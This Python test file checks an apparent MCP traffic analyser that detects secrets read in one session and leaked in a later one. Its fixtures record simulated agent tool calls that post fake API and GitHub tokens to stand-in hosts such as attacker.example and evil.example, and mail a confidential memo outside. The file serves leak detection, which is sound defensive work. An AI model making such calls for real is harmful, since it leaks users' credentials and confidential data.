"""Tests for Schema Migration V2 and opt-in cross-session persistent taint tracking (Issue #3)."""

from __future__ import annotations

import contextlib
import io
import json
import os
import sqlite3
import stat
import tempfile
import unittest
from pathlib import Path

from mcp_flow.cli import analyze_session, main as cli_main
from mcp_flow.derive.calls import derive_calls
from mcp_flow.derive.fragments import derive_fragments, normalize_basic, sha256_hex
from mcp_flow.graph.builder import OBSERVATION_DISCLAIMER, build_flow_graph
from mcp_flow.graph.exporters import format_cli_report
from mcp_flow.graph.paths import find_hazardous_paths
from mcp_flow.labels.rules import LabelRuleEngine
from mcp_flow.match.cross_session import CrossSessionMatcher, match_cross_session_taint
from mcp_flow.server.mcp_server import ReadOnlyFlowMcpServer
from mcp_flow.store.db import FlowStore, SCHEMA_V1_SQL


def _record_tool_call(
    store: FlowStore,
    session_id: str,
    server_name: str,
    tool_name: str,
    rpc_id: str,
    arguments: dict,
    result_text: str,
    ts_base: float,
) -> None:
    """Helper to append a realistic tools/call request + response pair to `messages`."""
    server_id = f"{session_id}:{server_name}"
    store.register_server(server_id, session_id, server_name)
    req_body = json.dumps(
        {
            "jsonrpc": "2.0",
            "id": rpc_id,
            "method": "tools/call",
            "params": {"name": tool_name, "arguments": arguments},
        },
        ensure_ascii=False,
    )
    res_body = json.dumps(
        {
            "jsonrpc": "2.0",
            "id": rpc_id,
            "result": {"content": [{"type": "text", "text": result_text}]},
        },
        ensure_ascii=False,
    )
    store.append_message(
        session_id=session_id,
        server_id=server_id,
        direction="c2s",
        kind="request",
        method="tools/call",
        rpc_id=rpc_id,
        body=req_body,
        ts=ts_base,
    )
    store.append_message(
        session_id=session_id,
        server_id=server_id,
        direction="s2c",
        kind="response",
        method=None,
        rpc_id=rpc_id,
        body=res_body,
        ts=ts_base + 0.05,
    )


class TestCrossSessionTaintTracking(unittest.TestCase):
    """Verify V1->V2 migration, hash-only persistent registry, and cross-session exfiltration detection."""

    def test_v1_to_v2_schema_migration_preserves_data_and_0600_permissions(self) -> None:
        """An existing V1 SQLite database must seamlessly migrate to V2 on open without losing data."""
        with tempfile.TemporaryDirectory() as tmpdir:
            db_file = Path(tmpdir) / "legacy_v1.db"

            # Bootstrap a V1-only database directly using SCHEMA_V1_SQL
            conn = sqlite3.connect(db_file)
            try:
                conn.executescript(SCHEMA_V1_SQL)
                conn.execute(
                    "INSERT INTO schema_migrations(version, applied_at, description) VALUES (1, 1000.0, 'Initial V1')"
                )
                conn.execute(
                    "INSERT INTO sessions(id, started_at, client, note) VALUES ('legacy_s1', 1000.0, 'test', 'v1')"
                )
                conn.commit()
            finally:
                conn.close()

            # Reopen with FlowStore -> must apply V2 migration automatically
            store = FlowStore(db_path=db_file)
            try:
                mode = stat.S_IMODE(os.stat(db_file).st_mode)
                self.assertEqual(mode, 0o600)

                versions = {
                    r["version"]
                    for r in store.conn.execute("SELECT version FROM schema_migrations").fetchall()
                }
                self.assertEqual(versions, {1, 2})

                # Existing V1 data preserved
                sessions = store.list_sessions()
                self.assertEqual(len(sessions), 1)
                self.assertEqual(sessions[0]["id"], "legacy_s1")

                # persistent_fingerprints columns match specification
                cols = [
                    r["name"]
                    for r in store.conn.execute("PRAGMA table_info(persistent_fingerprints)").fetchall()
                ]
                self.assertEqual(
                    cols,
                    [
                        "id",
                        "origin_session_id",
                        "origin_call_id",
                        "origin_frag_id",
                        "label",
                        "norm_hash",
                        "raw_hash",
                        "length",
                        "created_at",
                    ],
                )
            finally:
                store.close()

    def test_persistent_fingerprints_stores_hashes_only_no_plaintext(self) -> None:
        """persistent_fingerprints must record only hashes, lengths, and labels (never plaintext)."""
        secret_token = "sk-live-CrossSessionSecretToken99887766"
        store = FlowStore(db_path=":memory:")
        try:
            store.ensure_session("session_a", started_at=1000.0)
            _record_tool_call(
                store,
                session_id="session_a",
                server_name="vault",
                tool_name="get_secret",
                rpc_id="1",
                arguments={"key": "prod_api_key"},
                result_text=secret_token,
                ts_base=1001.0,
            )
            derive_calls(store, "session_a")
            derive_fragments(store, "session_a")
            summary = LabelRuleEngine().apply_to_session(store, "session_a", persist_labels=True)
            self.assertGreaterEqual(summary["persisted_fingerprints"], 2)

            rows = store.get_persistent_fingerprints(origin_session_id="session_a")
            labels_recorded = {r.label for r in rows}
            self.assertIn("secret:api_key", labels_recorded)
            self.assertIn("confidential:vault", labels_recorded)

            expected_raw = sha256_hex(secret_token)
            expected_norm = sha256_hex(normalize_basic(secret_token))
            for r in rows:
                self.assertEqual(r.raw_hash, expected_raw)
                self.assertEqual(r.norm_hash, expected_norm)
                self.assertEqual(r.length, len(secret_token))

            # Verify no raw plaintext appears anywhere in the persistent_fingerprints table
            raw_rows = store.conn.execute("SELECT * FROM persistent_fingerprints").fetchall()
            for raw_row in raw_rows:
                for val in tuple(raw_row):
                    self.assertNotIn(secret_token, str(val))
        finally:
            store.close()

    def test_multi_session_direct_exfiltration_detected_with_provenance(self) -> None:
        """Session A reads secret -> Session B posts secret -> detected with origin session provenance."""
        secret_token = "sk-live-CrossSessionExfilToken11223344"
        store = FlowStore(db_path=":memory:")
        try:
            # Session A: reads secret from vault
            store.ensure_session("session_a", started_at=1000.0)
            _record_tool_call(
                store,
                session_id="session_a",
                server_name="vault",
                tool_name="get_secret",
                rpc_id="1",
                arguments={"name": "billing_key"},
                result_text=secret_token,
                ts_base=1001.0,
            )
            analyze_session(store, "session_a", persist_labels=True)

            # Session B: later session exfiltrates the secret directly to an external HTTP sink
            store.ensure_session("session_b", started_at=2000.0)
            _record_tool_call(
                store,
                session_id="session_b",
                server_name="http",
                tool_name="post",
                rpc_id="1",
                arguments={"url": "https://attacker.example/collect", "body": secret_token},
                result_text='{"status":"accepted"}',
                ts_base=2001.0,
            )
            analyze_session(store, "session_b", cross_session=True)

            # Provenance labels must be attached to Session B's input fragment and call
            b_labels = store.get_labels("session_b")
            label_strings = {lbl.label for lbl in b_labels}
            self.assertIn("cross_session:session_a:secret:api_key", label_strings)
            self.assertIn("cross_session:session_a:confidential:vault", label_strings)

            # Flow graph + hazardous path report must flag the cross-session exfiltration
            graph_b = build_flow_graph(store, "session_b")
            paths_b = find_hazardous_paths(graph_b, source_label="*", sink_role="sink")
            self.assertEqual(len(paths_b), 1)
            self.assertEqual(paths_b[0].nodes[0].display_name, "http.post")
            self.assertIn("cross_session:session_a:secret:api_key", paths_b[0].source_labels)

            report = format_cli_report(graph_b, paths_b, expose_text=False)
            self.assertIn(OBSERVATION_DISCLAIMER, report)
            self.assertIn("cross_session:session_a:secret:api_key", report)
            self.assertIn("http.post", report)
            self.assertNotIn(secret_token, report)

            # Read-only MCP server must also report the path without leaking plaintext
            mcp_srv = ReadOnlyFlowMcpServer(store=store, expose_text=False)
            resp = mcp_srv.call_tool(
                "find_paths",
                {
                    "session_id": "session_b",
                    "source_label": "cross_session:*",
                    "sink_role": "sink",
                },
            )
            self.assertEqual(resp["disclaimer"], OBSERVATION_DISCLAIMER)
            self.assertEqual(resp["path_count"], 1)
            payload_text = json.dumps(resp, ensure_ascii=False)
            self.assertIn("cross_session:session_a:secret:api_key", payload_text)
            self.assertNotIn(secret_token, payload_text)
        finally:
            store.close()

    def test_cross_session_normalized_and_embedded_secret_matching(self) -> None:
        """Cross-session matching must detect normalized variants (norm_hash) and embedded secret spans."""
        confidential_doc = "Project Orion Acquisition Cap: $420,000,000"
        embedded_key = "sk-proj-EmbeddedCrossSessionKey445566"
        store = FlowStore(db_path=":memory:")
        try:
            store.ensure_session("session_a", started_at=1000.0)
            _record_tool_call(
                store,
                session_id="session_a",
                server_name="docs",
                tool_name="read_file",
                rpc_id="1",
                arguments={"path": "/corp/orion.md"},
                result_text=confidential_doc,
                ts_base=1001.0,
            )
            _record_tool_call(
                store,
                session_id="session_a",
                server_name="vault",
                tool_name="get_secret",
                rpc_id="2",
                arguments={"name": "service_token"},
                result_text=f"Issued credential: {embedded_key}",
                ts_base=1002.0,
            )
            analyze_session(store, "session_a", persist_labels=True)

            # Session B sends normalized (whitespace/case changed) doc to mail.send,
            # and bare embedded key to http.post
            store.ensure_session("session_b", started_at=2000.0)
            _record_tool_call(
                store,
                session_id="session_b",
                server_name="mail",
                tool_name="send",
                rpc_id="1",
                arguments={
                    "to": "external@example.com",
                    "body": "  project   orion acquisition cap: $420,000,000  ",
                },
                result_text="sent",
                ts_base=2001.0,
            )
            _record_tool_call(
                store,
                session_id="session_b",
                server_name="http",
                tool_name="post",
                rpc_id="2",
                arguments={"url": "https://evil.example/k", "token": embedded_key},
                result_text="ok",
                ts_base=2002.0,
            )
            analyze_session(store, "session_b", cross_session=True)

            graph_b = build_flow_graph(store, "session_b")
            paths_b = find_hazardous_paths(graph_b, source_label="cross_session:*", sink_role="sink")
            sink_names = {p.nodes[-1].display_name for p in paths_b}
            self.assertEqual(sink_names, {"mail.send", "http.post"})
        finally:
            store.close()

    def test_cross_session_multi_hop_within_session_b(self) -> None:
        """Taint entering a neutral tool in Session B and flowing to a sink must be reported as a multi-hop path."""
        secret_token = "ghp_MultiHopCrossSessionToken9876543210"
        store = FlowStore(db_path=":memory:")
        try:
            store.ensure_session("session_a", started_at=1000.0)
            _record_tool_call(
                store,
                session_id="session_a",
                server_name="vault",
                tool_name="get_secret",
                rpc_id="1",
                arguments={"name": "gh_pat"},
                result_text=secret_token,
                ts_base=1001.0,
            )
            analyze_session(store, "session_a", persist_labels=True)

            # Session B: neutral tool receives Session A secret, passes it to sink tool
            store.ensure_session("session_b", started_at=2000.0)
            _record_tool_call(
                store,
                session_id="session_b",
                server_name="formatter",
                tool_name="wrap",
                rpc_id="1",
                arguments={"input": secret_token},
                result_text=f"Payload({secret_token})",
                ts_base=2001.0,
            )
            _record_tool_call(
                store,
                session_id="session_b",
                server_name="mail",
                tool_name="send",
                rpc_id="2",
                arguments={"to": "ext@example.com", "body": f"Payload({secret_token})"},
                result_text="sent",
                ts_base=2002.0,
            )
            analyze_session(store, "session_b", cross_session=True)

            graph_b = build_flow_graph(store, "session_b")
            paths_b = find_hazardous_paths(graph_b, source_label="cross_session:*", sink_role="sink")
            multi_hop = [p for p in paths_b if len(p.nodes) == 2]
            self.assertEqual(len(multi_hop), 1)
            self.assertEqual(
                [n.display_name for n in multi_hop[0].nodes],
                ["formatter.wrap", "mail.send"],
            )
            self.assertIn("cross_session:session_a:secret:github_token", multi_hop[0].source_labels)
        finally:
            store.close()

    def test_opt_in_behavior_and_temporal_ordering(self) -> None:
        """Cross-session tracking must be strictly opt-in and respect session ordering."""
        secret_token = "sk-live-TemporalOrderingToken55667788"
        store = FlowStore(db_path=":memory:")
        try:
            # Session A without --persist-labels -> nothing persisted
            store.ensure_session("session_a", started_at=1000.0)
            _record_tool_call(
                store,
                session_id="session_a",
                server_name="vault",
                tool_name="get_secret",
                rpc_id="1",
                arguments={"name": "k"},
                result_text=secret_token,
                ts_base=1001.0,
            )
            analyze_session(store, "session_a", persist_labels=False)
            self.assertEqual(len(store.get_persistent_fingerprints()), 0)

            # Session B (t=2000) posts secret; Session C (t=3000, AFTER B) reads secret and persists it
            store.ensure_session("session_b", started_at=2000.0)
            _record_tool_call(
                store,
                session_id="session_b",
                server_name="http",
                tool_name="post",
                rpc_id="1",
                arguments={"url": "https://example.com", "body": secret_token},
                result_text="ok",
                ts_base=2001.0,
            )
            store.ensure_session("session_c", started_at=3000.0)
            _record_tool_call(
                store,
                session_id="session_c",
                server_name="vault",
                tool_name="get_secret",
                rpc_id="1",
                arguments={"name": "k"},
                result_text=secret_token,
                ts_base=3001.0,
            )
            analyze_session(store, "session_c", persist_labels=True)
            self.assertGreater(len(store.get_persistent_fingerprints("session_c")), 0)

            # Analyzing Session B with cross_session=True must NOT match later Session C
            analyze_session(store, "session_b", cross_session=True)
            b_cross_labels = [
                lbl.label
                for lbl in store.get_labels("session_b")
                if lbl.label.startswith("cross_session:")
            ]
            self.assertEqual(b_cross_labels, [])

            # Same-session matching must also NOT self-taint Session C
            self_matches = match_cross_session_taint(store, "session_c")
            self.assertEqual(self_matches, [])

            # Now persist Session A (t=1000 < B's t=2000), but analyze B WITHOUT cross_session -> opt-in respected
            matcher = CrossSessionMatcher()
            matcher.register_session(store, "session_a")
            analyze_session(store, "session_b", cross_session=False)
            b_cross_labels_opt_out = [
                lbl.label
                for lbl in store.get_labels("session_b")
                if lbl.label.startswith("cross_session:")
            ]
            self.assertEqual(b_cross_labels_opt_out, [])
        finally:
            store.close()

    def test_cli_end_to_end_persist_labels_and_cross_session_report(self) -> None:
        """CLI `analyze --persist-labels`, `analyze --cross-session`, and `report` must work end-to-end."""
        secret_token = "sk-live-CliCrossSessionToken99001122"
        with tempfile.TemporaryDirectory() as tmpdir:
            db_file = Path(tmpdir) / "cli_cross.db"
            store = FlowStore(db_path=db_file)
            try:
                store.ensure_session("sess_a", started_at=1000.0)
                _record_tool_call(
                    store,
                    session_id="sess_a",
                    server_name="vault",
                    tool_name="get_secret",
                    rpc_id="1",
                    arguments={"name": "cli_key"},
                    result_text=secret_token,
                    ts_base=1001.0,
                )
                store.ensure_session("sess_b", started_at=2000.0)
                _record_tool_call(
                    store,
                    session_id="sess_b",
                    server_name="mail",
                    tool_name="send",
                    rpc_id="1",
                    arguments={"to": "leak@example.com", "body": secret_token},
                    result_text="sent",
                    ts_base=2001.0,
                )
            finally:
                store.close()

            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc1 = cli_main(["--db", str(db_file), "analyze", "sess_a", "--persist-labels"])
                rc2 = cli_main(["--db", str(db_file), "analyze", "sess_b", "--cross-session"])
            self.assertEqual(rc1, 0)
            self.assertEqual(rc2, 0)

            report_buf = io.StringIO()
            with contextlib.redirect_stdout(report_buf):
                rc3 = cli_main(
                    ["--db", str(db_file), "report", "sess_b", "--format", "json"]
                )
            self.assertEqual(rc3, 0)
            report_data = json.loads(report_buf.getvalue())
            self.assertEqual(report_data["disclaimer"], OBSERVATION_DISCLAIMER)
            self.assertEqual(len(report_data["hazardous_paths"]), 1)
            self.assertIn(
                "cross_session:sess_a:secret:api_key",
                report_data["hazardous_paths"][0]["source_labels"],
            )

    def test_source_label_globbing_and_min_score_for_cross_session_labels(self) -> None:
        """`--source-label secret:*` must match `cross_session:<sid>:secret:*` and exclude unrelated patterns like `pii:*`."""
        secret_token = "sk-live-SourceLabelGlobToken123456"
        with tempfile.TemporaryDirectory() as tmpdir:
            db_file = Path(tmpdir) / "source_glob.db"
            store = FlowStore(db_path=db_file)
            try:
                store.ensure_session("session_a", started_at=1000.0)
                _record_tool_call(
                    store,
                    session_id="session_a",
                    server_name="vault",
                    tool_name="get_secret",
                    rpc_id="1",
                    arguments={"name": "api_key"},
                    result_text=secret_token,
                    ts_base=1001.0,
                )
                analyze_session(store, "session_a", persist_labels=True)

                store.ensure_session("session_b", started_at=2000.0)
                _record_tool_call(
                    store,
                    session_id="session_b",
                    server_name="http",
                    tool_name="post",
                    rpc_id="1",
                    arguments={"url": "https://attacker.example/leak", "body": secret_token},
                    result_text="ok",
                    ts_base=2001.0,
                )
                analyze_session(store, "session_b", cross_session=True)

                graph_b = build_flow_graph(store, "session_b")

                # Direct API check: secret:* matches cross_session:session_a:secret:api_key
                paths_secret = find_hazardous_paths(graph_b, source_label="secret:*", sink_role="sink")
                self.assertEqual(len(paths_secret), 1)
                self.assertEqual(
                    paths_secret[0].source_labels,
                    ["cross_session:session_a:secret:api_key"],
                )

                # Unrelated pattern must NOT match cross_session:...:secret:api_key
                paths_pii = find_hazardous_paths(graph_b, source_label="pii:*", sink_role="sink")
                self.assertEqual(paths_pii, [])

                # min_score > 1.0 must skip single-node cross-session path (score 1.0)
                paths_high_min = find_hazardous_paths(
                    graph_b,
                    source_label="secret:*",
                    sink_role="sink",
                    min_score=1.1,
                )
                self.assertEqual(paths_high_min, [])
            finally:
                store.close()

            # CLI `report session_b --source-label "secret:*"` vs `--source-label "pii:*"`
            buf_secret = io.StringIO()
            with contextlib.redirect_stdout(buf_secret):
                rc_sec = cli_main(
                    [
                        "--db",
                        str(db_file),
                        "report",
                        "session_b",
                        "--source-label",
                        "secret:*",
                        "--format",
                        "json",
                    ]
                )
            self.assertEqual(rc_sec, 0)
            data_sec = json.loads(buf_secret.getvalue())
            self.assertEqual(len(data_sec["hazardous_paths"]), 1)
            self.assertEqual(
                data_sec["hazardous_paths"][0]["source_labels"],
                ["cross_session:session_a:secret:api_key"],
            )

            buf_pii = io.StringIO()
            with contextlib.redirect_stdout(buf_pii):
                rc_pii = cli_main(
                    [
                        "--db",
                        str(db_file),
                        "report",
                        "session_b",
                        "--source-label",
                        "pii:*",
                        "--format",
                        "json",
                    ]
                )
            self.assertEqual(rc_pii, 0)
            data_pii = json.loads(buf_pii.getvalue())
            self.assertEqual(data_pii["hazardous_paths"], [])

    def test_cli_report_cross_session_on_already_analyzed_session(self) -> None:
        """`analyze session_b` followed by `report session_b --cross-session` must work without `--recompute`."""
        secret_token = "sk-live-ReportCrossFlagToken778899"
        with tempfile.TemporaryDirectory() as tmpdir:
            db_file = Path(tmpdir) / "report_cross.db"
            store = FlowStore(db_path=db_file)
            try:
                store.ensure_session("session_a", started_at=1000.0)
                _record_tool_call(
                    store,
                    session_id="session_a",
                    server_name="vault",
                    tool_name="get_secret",
                    rpc_id="1",
                    arguments={"name": "k"},
                    result_text=secret_token,
                    ts_base=1001.0,
                )
                store.ensure_session("session_b", started_at=2000.0)
                _record_tool_call(
                    store,
                    session_id="session_b",
                    server_name="http",
                    tool_name="post",
                    rpc_id="1",
                    arguments={"url": "https://attacker.example/drop", "body": secret_token},
                    result_text="ok",
                    ts_base=2001.0,
                )
            finally:
                store.close()

            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc1 = cli_main(["--db", str(db_file), "analyze", "session_a", "--persist-labels"])
                # Plain analyze of session_b WITHOUT --cross-session
                rc2 = cli_main(["--db", str(db_file), "analyze", "session_b"])
            self.assertEqual(rc1, 0)
            self.assertEqual(rc2, 0)

            report_buf = io.StringIO()
            with contextlib.redirect_stdout(report_buf):
                rc3 = cli_main(
                    [
                        "--db",
                        str(db_file),
                        "report",
                        "session_b",
                        "--cross-session",
                        "--format",
                        "json",
                    ]
                )
            self.assertEqual(rc3, 0)
            report_data = json.loads(report_buf.getvalue())
            self.assertEqual(len(report_data["hazardous_paths"]), 1)
            self.assertIn(
                "cross_session:session_a:secret:api_key",
                report_data["hazardous_paths"][0]["source_labels"],
            )

    def test_reanalyze_without_persist_labels_clears_persistent_fingerprints(self) -> None:
        """Re-running `analyze_session(store, 'session_a', persist_labels=False)` must clear old fingerprints."""
        secret_token = "sk-live-StaleClearToken00112233"
        store = FlowStore(db_path=":memory:")
        try:
            store.ensure_session("session_a", started_at=1000.0)
            _record_tool_call(
                store,
                session_id="session_a",
                server_name="vault",
                tool_name="get_secret",
                rpc_id="1",
                arguments={"name": "k"},
                result_text=secret_token,
                ts_base=1001.0,
            )
            analyze_session(store, "session_a", persist_labels=True)
            self.assertGreater(len(store.get_persistent_fingerprints("session_a")), 0)

            # Re-analyze without persistence -> persistent_fingerprints for session_a must be cleared
            analyze_session(store, "session_a", persist_labels=False)
            self.assertEqual(store.get_persistent_fingerprints("session_a"), [])
        finally:
            store.close()

    def test_call_inherited_labels_suppress_short_generic_false_positives(self) -> None:
        """Short generic JSON fields like `'status': 'completed'` from `docs.read_file` must NOT taint Session B."""
        store = FlowStore(db_path=":memory:")
        try:
            store.ensure_session("session_a", started_at=1000.0)
            _record_tool_call(
                store,
                session_id="session_a",
                server_name="docs",
                tool_name="read_file",
                rpc_id="1",
                arguments={"path": "/corp/memo.json"},
                result_text=json.dumps(
                    {
                        "status": "completed",
                        "env": "production",
                        "region": "us-east-1",
                        "memo": "Confidential Project Orion M&A valuation cap is $420,000,000.",
                    }
                ),
                ts_base=1001.0,
            )
            analyze_session(store, "session_a", persist_labels=True)

            # Only the substantial memo (and outer JSON payload >=16 chars) should be persisted,
            # never short generic values like "completed", "production", or "us-east-1".
            fps = store.get_persistent_fingerprints("session_a")
            fp_raw_hashes = {fp.raw_hash for fp in fps}
            for generic_val in ("completed", "production", "us-east-1"):
                self.assertNotIn(sha256_hex(generic_val), fp_raw_hashes)

            store.ensure_session("session_b", started_at=2000.0)
            _record_tool_call(
                store,
                session_id="session_b",
                server_name="http",
                tool_name="post",
                rpc_id="1",
                arguments={"url": "https://metrics.example/status", "payload": json.dumps({"status": "completed"})},
                result_text="ok",
                ts_base=2001.0,
            )
            matches = match_cross_session_taint(store, "session_b")
            self.assertEqual(matches, [])

            analyze_session(store, "session_b", cross_session=True)
            graph_b = build_flow_graph(store, "session_b")
            paths_b = find_hazardous_paths(graph_b, source_label="*", sink_role="sink")
            self.assertEqual(paths_b, [])
        finally:
            store.close()


if __name__ == "__main__":
    unittest.main()
